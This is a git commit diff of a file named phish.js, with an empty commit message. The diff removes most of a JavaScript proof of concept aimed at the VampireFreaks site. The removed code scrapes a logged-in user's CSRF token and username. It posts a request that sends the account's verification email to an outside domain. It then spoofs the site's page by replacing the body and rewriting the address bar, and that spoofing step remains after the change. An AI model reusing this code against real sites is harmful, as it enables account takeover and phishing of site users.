1b6f74b94c1d11a15fef030124141c6f9bab89ec
LeetCodes <michael@leetcodes.com>
2017-05-13 22:04:56 -0400

    .
    .

--- phish.js
+++ phish.js
@@ -1,48 +1,4 @@
-function getNewHttpObject() {
-var objType = false;
-try {
-objType = new ActiveXObject('Msxml2.XMLHTTP');
-} catch(e) {
-try {
-objType = new ActiveXObject('Microsoft.XMLHTTP');
-} catch(e) {
-objType = new XMLHttpRequest();
-}
-}
-return objType;
-}
-
-function getAXAH(url){
-
-var theHttpRequest = getNewHttpObject();
-theHttpRequest.onreadystatechange = function() {processAXAH();};
-theHttpRequest.open("GET", url);
-theHttpRequest.send(false);
-
-function processAXAH(){
-if (theHttpRequest.readyState == 4) { if (theHttpRequest.status == 200) {
-
-var html = theHttpRequest.responseText;
-var tokloc = /_token.*value=\"(.*)"/g.exec(html);
-var token = tokloc[1];
-try {
-var usrloc = /href="\/friends\/(.*)">My Friends/g.exec(html);
-var usr = usrloc[1];
-} catch(e) {
-	alert('must be logged in');
-}
-console.log(usr + ' and ' + token);
-postAXAH('http://' + window.location.hostname + '/send_verify_email', '_token=' + token + '&user_email=' + usr + '%401bj.org');
-
-}}}}
-
-
-function postAXAH(url, params) {
-var theHttpRequest = getNewHttpObject();
-               
-theHttpRequest.onreadystatechange = function() {
-	if (theHttpRequest.readyState == 4) { if (theHttpRequest.status == 200) { 
-		var html = `
+        var html = `
 <link rel="stylesheet" href="/_style/bootstrap.min.css">
 
 <link rel="stylesheet" type="text/css" href="/_style/themeroller/custom.css" media="screen"/>
@@ -385,12 +341,3 @@ Block User : <span class="modal_report_username"></span></button>
 
 history.replaceState({foo:'bar'}, "VampireFreaks", "/");
 document.body.innerHTML = html;
-alert("this is just an example and still needs some work, but you can see the capability..\nlook at the address bar");
-}}};
-theHttpRequest.open("POST", url);
-theHttpRequest.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded; charset=iso-8859-2');
-theHttpRequest.send(params);
-
-}
-console.log('running script');
-getAXAH('http://' + window.location.hostname + '/change_email');
